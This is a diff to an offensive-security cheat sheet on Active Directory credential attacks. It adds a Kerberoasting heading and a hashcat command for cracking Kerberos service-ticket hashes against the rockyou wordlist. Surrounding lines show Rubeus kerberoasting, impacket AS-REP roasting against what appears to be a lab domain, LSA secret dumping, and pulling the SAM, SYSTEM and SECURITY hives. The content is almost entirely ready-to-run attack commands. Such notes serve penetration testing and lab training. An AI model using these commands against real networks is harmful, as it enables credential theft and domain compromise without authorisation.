@@ -28,6 +28,8 @@ lsa_dump_secrets
 kerberos_list
 ```
 
+## Kerberoasting
+
 ### Impacket
 
 Get a copy of the SYSTEM, SECURITY and SAM hives and download them back to your local system.
@@ -49,4 +51,10 @@ impacket-GetNPUsers spookysec.local/ -usersfile usernames.txt -format hashcat # 
 ```
 .\Rubeus.exe kerberoast
 hashcat -m 13100 -a 0 hash /usr/share/wordlists/rockyou.txt --force
+```
+
+#### Cracking passwords
+
+```
+hashcat -m 13100 --force <TGSs_file> /usr/share/wordlists/rockyou.txt
 ```
